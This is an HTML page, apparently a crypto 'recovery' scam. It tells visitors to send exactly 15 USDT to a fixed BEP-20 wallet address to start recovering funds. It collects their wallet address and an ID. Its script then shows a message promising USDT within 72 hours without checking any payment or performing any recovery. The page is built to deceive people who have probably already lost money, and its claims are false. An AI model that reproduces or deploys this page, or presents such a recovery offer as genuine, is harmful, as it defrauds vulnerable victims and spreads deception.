<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>UBX Recovery</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      background-color: #f2f2f2;
      text-align: center;
      padding: 30px;
    }

    .container {
      max-width: 450px;
      margin: 0 auto;
      background: white;
      padding: 30px;
      border-radius: 10px;
      box-shadow: 0 0 10px rgba(0,0,0,0.1);
    }

    img.logo {
      max-width: 150px;
      margin-bottom: 20px;
    }

    input[type="text"], input[type="number"] {
      width: 100%;
      padding: 12px;
      margin: 8px 0;
      box-sizing: border-box;
      border-radius: 5px;
      border: 1px solid #ccc;
    }

    button {
      background-color: #28a745;
      color: white;
      padding: 12px 20px;
      border: none;
      border-radius: 5px;
      cursor: pointer;
      margin-top: 10px;
    }

    .message {
      margin-top: 20px;
      font-weight: bold;
      display: none;
    }

    .success {
      color: green;
    }

    .error {
      color: red;
    }

    .wallet-box {
      background-color: #f5f5f5;
      border-radius: 5px;
      padding: 10px;
      font-weight: bold;
      margin: 10px 0 20px;
    }
  </style>
</head>
<body>

  <div class="container">
    <img src="logo.png" alt="Logo" class="logo">

    <h2>UBX Recovery</h2>

    <p><strong>Send exactly 15 USDT to the following address to initiate your recovery:</strong></p>
    <div class="wallet-box">
      0xB2801391e58e4D973836D2B26B9b7E77CCd08f7C
    </div>

    <p><strong>Network:</strong> BEP 20 (BSC)</p>

    <input type="text" placeholder="Your Wallet Address" id="wallet">
    <input type="text" placeholder="Your ID" id="userId">

    <button onclick="showMessage()">I HAVE SENT 15 USDT</button>

    <p class="message" id="errorMessage"></p>
  </div>

  <script>
    function showMessage() {
      const wallet = document.getElementById("wallet").value.trim();
      const userId = document.getElementById("userId").value.trim();
      const errorMessage = document.getElementById("errorMessage");

      if (!wallet || !userId) {
        errorMessage.style.display = "block";
        errorMessage.className = "message error";
        errorMessage.innerText = "Please fill in all required information";
      } else {
        errorMessage.style.display = "block";
        errorMessage.className = "message success";
        errorMessage.innerText = "Thank you. You will receive your USDT at the provided wallet address within 72 hours.";
      }
    }
  </script>

</body>
</html>
